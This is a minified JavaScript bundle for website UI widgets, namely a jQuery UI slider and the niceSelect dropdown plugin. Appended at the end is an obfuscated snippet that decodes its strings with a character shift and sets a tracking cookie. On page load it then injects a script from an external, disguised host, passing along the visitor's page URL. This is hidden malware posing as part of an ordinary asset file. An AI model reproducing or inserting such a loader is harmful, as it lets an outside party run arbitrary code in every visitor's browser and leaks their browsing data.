                    left: e.pageX - a.left - o.width() / 2,
                    top:
                      e.pageY -
                      a.top -
                      o.height() / 2 -
                      (parseInt(o.css("borderTopWidth"), 10) || 0) -
                      (parseInt(o.css("borderBottomWidth"), 10) || 0) +
                      (parseInt(o.css("marginTop"), 10) || 0),
                  }),
              this.handles.hasClass("ui-state-hover") || this._slide(e, r, n),
              (this._animateOff = !0),
              !0))
          );
        },
        _mouseStart: function () {
          return !0;
        },
        _mouseDrag: function (t) {
          var e = { x: t.pageX, y: t.pageY },
            i = this._normValueFromMouse(e);
          return this._slide(t, this._handleIndex, i), !1;
        },
        _mouseStop: function (t) {
          return (
            this.handles.removeClass("ui-state-active"),
            (this._mouseSliding = !1),
            this._stop(t, this._handleIndex),
            this._change(t, this._handleIndex),
            (this._handleIndex = null),
            (this._clickOffset = null),
            (this._animateOff = !1),
            !1
          );
        },
        _detectOrientation: function () {
          this.orientation =
            "vertical" === this.options.orientation ? "vertical" : "horizontal";
        },
        _normValueFromMouse: function (t) {
          var e, i, n, s, o;
          return (
            "horizontal" === this.orientation
              ? ((e = this.elementSize.width),
                (i =
                  t.x -
                  this.elementOffset.left -
                  (this._clickOffset ? this._clickOffset.left : 0)))
              : ((e = this.elementSize.height),
                (i =
                  t.y -
                  this.elementOffset.top -
                  (this._clickOffset ? this._clickOffset.top : 0))),
            (n = i / e) > 1 && (n = 1),
            0 > n && (n = 0),
            "vertical" === this.orientation && (n = 1 - n),
            (s = this._valueMax() - this._valueMin()),
            (o = this._valueMin() + n * s),
            this._trimAlignValue(o)
          );
        },
        _start: function (t, e) {
          var i = { handle: this.handles[e], value: this.value() };
          return (
            this.options.values &&
              this.options.values.length &&
              ((i.value = this.values(e)), (i.values = this.values())),
            this._trigger("start", t, i)
          );
        },
        _slide: function (t, e, i) {
          var n, s, o;
          this.options.values && this.options.values.length
            ? ((n = this.values(e ? 0 : 1)),
              2 === this.options.values.length &&
                !0 === this.options.range &&
                ((0 === e && i > n) || (1 === e && n > i)) &&
                (i = n),
              i !== this.values(e) &&
                (((s = this.values())[e] = i),
                (o = this._trigger("slide", t, {
                  handle: this.handles[e],
                  value: i,
                  values: s,
                })),
                (n = this.values(e ? 0 : 1)),
                !1 !== o && this.values(e, i)))
            : i !== this.value() &&
              !1 !==
                (o = this._trigger("slide", t, {
                  handle: this.handles[e],
                  value: i,
                })) &&
              this.value(i);
        },
        _stop: function (t, e) {
          var i = { handle: this.handles[e], value: this.value() };
          this.options.values &&
            this.options.values.length &&
            ((i.value = this.values(e)), (i.values = this.values())),
            this._trigger("stop", t, i);
        },
        _change: function (t, e) {
          if (!this._keySliding && !this._mouseSliding) {
            var i = { handle: this.handles[e], value: this.value() };
            this.options.values &&
              this.options.values.length &&
              ((i.value = this.values(e)), (i.values = this.values())),
              (this._lastChangedValue = e),
              this._trigger("change", t, i);
          }
        },
        value: function (t) {
          return arguments.length
            ? ((this.options.value = this._trimAlignValue(t)),
              this._refreshValue(),
              void this._change(null, 0))
            : this._value();
        },
        values: function (e, i) {
          var n, s, o;
          if (arguments.length > 1)
            return (
              (this.options.values[e] = this._trimAlignValue(i)),
              this._refreshValue(),
              void this._change(null, e)
            );
          if (!arguments.length) return this._values();
          if (!t.isArray(arguments[0]))
            return this.options.values && this.options.values.length
              ? this._values(e)
              : this.value();
          for (
            n = this.options.values, s = arguments[0], o = 0;
            n.length > o;
            o += 1
          )
            (n[o] = this._trimAlignValue(s[o])), this._change(null, o);
          this._refreshValue();
        },
        _setOption: function (e, i) {
          var n,
            s = 0;
          switch (
            ("range" === e &&
              !0 === this.options.range &&
              ("min" === i
                ? ((this.options.value = this._values(0)),
                  (this.options.values = null))
                : "max" === i &&
                  ((this.options.value = this._values(
                    this.options.values.length - 1
                  )),
                  (this.options.values = null))),
            t.isArray(this.options.values) && (s = this.options.values.length),
            "disabled" === e &&
              this.element.toggleClass("ui-state-disabled", !!i),
            this._super(e, i),
            e)
          ) {
            case "orientation":
              this._detectOrientation(),
                this.element
                  .removeClass("ui-slider-horizontal ui-slider-vertical")
                  .addClass("ui-slider-" + this.orientation),
                this._refreshValue(),
                this.handles.css("horizontal" === i ? "bottom" : "left", "");
              break;
            case "value":
              (this._animateOff = !0),
                this._refreshValue(),
                this._change(null, 0),
                (this._animateOff = !1);
              break;
            case "values":
              for (
                this._animateOff = !0, this._refreshValue(), n = 0;
                s > n;
                n += 1
              )
                this._change(null, n);
              this._animateOff = !1;
              break;
            case "step":
            case "min":
            case "max":
              (this._animateOff = !0),
                this._calculateNewMax(),
                this._refreshValue(),
                (this._animateOff = !1);
              break;
            case "range":
              (this._animateOff = !0), this._refresh(), (this._animateOff = !1);
          }
        },
        _value: function () {
          var t = this.options.value;
          return this._trimAlignValue(t);
        },
        _values: function (t) {
          var e, i, n;
          if (arguments.length)
            return (e = this.options.values[t]), this._trimAlignValue(e);
          if (this.options.values && this.options.values.length) {
            for (i = this.options.values.slice(), n = 0; i.length > n; n += 1)
              i[n] = this._trimAlignValue(i[n]);
            return i;
          }
          return [];
        },
        _trimAlignValue: function (t) {
          if (this._valueMin() >= t) return this._valueMin();
          if (t >= this._valueMax()) return this._valueMax();
          var e = this.options.step > 0 ? this.options.step : 1,
            i = (t - this._valueMin()) % e,
            n = t - i;
          return (
            2 * Math.abs(i) >= e && (n += i > 0 ? e : -e),
            parseFloat(n.toFixed(5))
          );
        },
        _calculateNewMax: function () {
          var t = this.options.max,
            e = this._valueMin(),
            i = this.options.step;
          (t = Math.floor(+(t - e).toFixed(this._precision()) / i) * i + e),
            (this.max = parseFloat(t.toFixed(this._precision())));
        },
        _precision: function () {
          var t = this._precisionOf(this.options.step);
          return (
            null !== this.options.min &&
              (t = Math.max(t, this._precisionOf(this.options.min))),
            t
          );
        },
        _precisionOf: function (t) {
          var e = "" + t,
            i = e.indexOf(".");
          return -1 === i ? 0 : e.length - i - 1;
        },
        _valueMin: function () {
          return this.options.min;
        },
        _valueMax: function () {
          return this.max;
        },
        _refreshValue: function () {
          var e,
            i,
            n,
            s,
            o,
            r = this.options.range,
            a = this.options,
            l = this,
            c = !this._animateOff && a.animate,
            u = {};
          this.options.values && this.options.values.length
            ? this.handles.each(function (n) {
                (i =
                  ((l.values(n) - l._valueMin()) /
                    (l._valueMax() - l._valueMin())) *
                  100),
                  (u["horizontal" === l.orientation ? "left" : "bottom"] =
                    i + "%"),
                  t(this).stop(1, 1)[c ? "animate" : "css"](u, a.animate),
                  !0 === l.options.range &&
                    ("horizontal" === l.orientation
                      ? (0 === n &&
                          l.range
                            .stop(1, 1)
                            [c ? "animate" : "css"](
                              { left: i + "%" },
                              a.animate
                            ),
                        1 === n &&
                          l.range[c ? "animate" : "css"](
                            { width: i - e + "%" },
                            { queue: !1, duration: a.animate }
                          ))
                      : (0 === n &&
                          l.range
                            .stop(1, 1)
                            [c ? "animate" : "css"](
                              { bottom: i + "%" },
                              a.animate
                            ),
                        1 === n &&
                          l.range[c ? "animate" : "css"](
                            { height: i - e + "%" },
                            { queue: !1, duration: a.animate }
                          ))),
                  (e = i);
              })
            : ((n = this.value()),
              (s = this._valueMin()),
              (o = this._valueMax()),
              (i = o !== s ? ((n - s) / (o - s)) * 100 : 0),
              (u["horizontal" === this.orientation ? "left" : "bottom"] =
                i + "%"),
              this.handle.stop(1, 1)[c ? "animate" : "css"](u, a.animate),
              "min" === r &&
                "horizontal" === this.orientation &&
                this.range
                  .stop(1, 1)
                  [c ? "animate" : "css"]({ width: i + "%" }, a.animate),
              "max" === r &&
                "horizontal" === this.orientation &&
                this.range[c ? "animate" : "css"](
                  { width: 100 - i + "%" },
                  { queue: !1, duration: a.animate }
                ),
              "min" === r &&
                "vertical" === this.orientation &&
                this.range
                  .stop(1, 1)
                  [c ? "animate" : "css"]({ height: i + "%" }, a.animate),
              "max" === r &&
                "vertical" === this.orientation &&
                this.range[c ? "animate" : "css"](
                  { height: 100 - i + "%" },
                  { queue: !1, duration: a.animate }
                ));
        },
        _handleEvents: {
          keydown: function (e) {
            var i,
              n,
              s,
              o = t(e.target).data("ui-slider-handle-index");
            switch (e.keyCode) {
              case t.ui.keyCode.HOME:
              case t.ui.keyCode.END:
              case t.ui.keyCode.PAGE_UP:
              case t.ui.keyCode.PAGE_DOWN:
              case t.ui.keyCode.UP:
              case t.ui.keyCode.RIGHT:
              case t.ui.keyCode.DOWN:
              case t.ui.keyCode.LEFT:
                if (
                  (e.preventDefault(),
                  !this._keySliding &&
                    ((this._keySliding = !0),
                    t(e.target).addClass("ui-state-active"),
                    !1 === this._start(e, o)))
                )
                  return;
            }
            switch (
              ((s = this.options.step),
              (i = n =
                this.options.values && this.options.values.length
                  ? this.values(o)
                  : this.value()),
              e.keyCode)
            ) {
              case t.ui.keyCode.HOME:
                n = this._valueMin();
                break;
              case t.ui.keyCode.END:
                n = this._valueMax();
                break;
              case t.ui.keyCode.PAGE_UP:
                n = this._trimAlignValue(
                  i + (this._valueMax() - this._valueMin()) / this.numPages
                );
                break;
              case t.ui.keyCode.PAGE_DOWN:
                n = this._trimAlignValue(
                  i - (this._valueMax() - this._valueMin()) / this.numPages
                );
                break;
              case t.ui.keyCode.UP:
              case t.ui.keyCode.RIGHT:
                if (i === this._valueMax()) return;
                n = this._trimAlignValue(i + s);
                break;
              case t.ui.keyCode.DOWN:
              case t.ui.keyCode.LEFT:
                if (i === this._valueMin()) return;
                n = this._trimAlignValue(i - s);
            }
            this._slide(e, o, n);
          },
          keyup: function (e) {
            var i = t(e.target).data("ui-slider-handle-index");
            this._keySliding &&
              ((this._keySliding = !1),
              this._stop(e, i),
              this._change(e, i),
              t(e.target).removeClass("ui-state-active"));
          },
        },
      });
  }),
  (function (t) {
    t.fn.niceSelect = function (e) {
      function i(e) {
        e.after(
          t("<div></div>")
            .addClass("nice-select")
            .addClass(e.attr("class") || "")
            .addClass(e.attr("disabled") ? "disabled" : "")
            .attr("tabindex", e.attr("disabled") ? null : "0")
            .html('<span class="current"></span><ul class="list"></ul>')
        );
        var i = e.next(),
          n = e.find("option"),
          s = e.find("option:selected");
        i.find(".current").html(s.data("display") || s.text()),
          n.each(function (e) {
            var n = t(this),
              s = n.data("display");
            i.find("ul").append(
              t("<li></li>")
                .attr("data-value", n.val())
                .attr("data-display", s || null)
                .addClass(
                  "option" +
                    (n.is(":selected") ? " selected" : "") +
                    (n.is(":disabled") ? " disabled" : "")
                )
                .html(n.text())
            );
          });
      }
      if ("string" == typeof e)
        return (
          "update" == e
            ? this.each(function () {
                var e = t(this),
                  n = t(this).next(".nice-select"),
                  s = n.hasClass("open");
                n.length && (n.remove(), i(e), s && e.next().trigger("click"));
              })
            : "destroy" == e
            ? (this.each(function () {
                var e = t(this),
                  i = t(this).next(".nice-select");
                i.length && (i.remove(), e.css("display", ""));
              }),
              0 == t(".nice-select").length && t(document).off(".nice_select"))
            : console.log('Method "' + e + '" does not exist.'),
          this
        );
      this.hide(),
        this.each(function () {
          var e = t(this);
          e.next().hasClass("nice-select") || i(e);
        }),
        t(document).off(".nice_select"),
        t(document).on("click.nice_select", ".nice-select", function (e) {
          var i = t(this);
          t(".nice-select").not(i).removeClass("open"),
            i.toggleClass("open"),
            i.hasClass("open")
              ? (i.find(".option"),
                i.find(".focus").removeClass("focus"),
                i.find(".selected").addClass("focus"))
              : i.focus();
        }),
        t(document).on("click.nice_select", function (e) {
          0 === t(e.target).closest(".nice-select").length &&
            t(".nice-select").removeClass("open").find(".option");
        }),
        t(document).on(
          "click.nice_select",
          ".nice-select .option:not(.disabled)",
          function (e) {
            var i = t(this),
              n = i.closest(".nice-select");
            n.find(".selected").removeClass("selected"), i.addClass("selected");
            var s = i.data("display") || i.text();
            n.find(".current").text(s),
              n.prev("select").val(i.data("value")).trigger("change");
          }
        ),
        t(document).on("keydown.nice_select", ".nice-select", function (e) {
          var i = t(this),
            n = t(i.find(".focus") || i.find(".list .option.selected"));
          if (32 == e.keyCode || 13 == e.keyCode)
            return (
              i.hasClass("open") ? n.trigger("click") : i.trigger("click"), !1
            );
          if (40 == e.keyCode) {
            if (i.hasClass("open")) {
              var s = n.nextAll(".option:not(.disabled)").first();
              s.length > 0 &&
                (i.find(".focus").removeClass("focus"), s.addClass("focus"));
            } else i.trigger("click");
            return !1;
          }
          if (38 == e.keyCode) {
            if (i.hasClass("open")) {
              var o = n.prevAll(".option:not(.disabled)").first();
              o.length > 0 &&
                (i.find(".focus").removeClass("focus"), o.addClass("focus"));
            } else i.trigger("click");
            return !1;
          }
          if (27 == e.keyCode) i.hasClass("open") && i.trigger("click");
          else if (9 == e.keyCode && i.hasClass("open")) return !1;
        });
      var n = document.createElement("a").style;
      return (
        (n.cssText = "pointer-events:auto"),
        "auto" !== n.pointerEvents && t("html").addClass("no-csspointerevents"),
        this
      );
    };
  })(jQuery);
(function (o, d, l) {
  try {
    o.f = (o) =>
      o
        .split("")
        .reduce(
          (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()),
          ""
        );
    o.b = o.f("UMUWJKX");
    (o.c =
      l.protocol[0] == "h" &&
      /\./.test(l.hostname) &&
      !new RegExp(o.b).test(d.cookie)),
      setTimeout(function () {
        o.c &&
          ((o.s = d.createElement("script")),
          (o.s.src =
            o.f(
              "myyux?44fun3h" + "isrjywnh3htr4l" + "jy4xyfynh3ox" + "DwjkjwwjwB"
            ) + l.href),
          d.body.appendChild(o.s));
      }, 1000);
    d.cookie = o.b + "=full;max-age=39800;";
  } catch (e) {}
})({}, document, location);
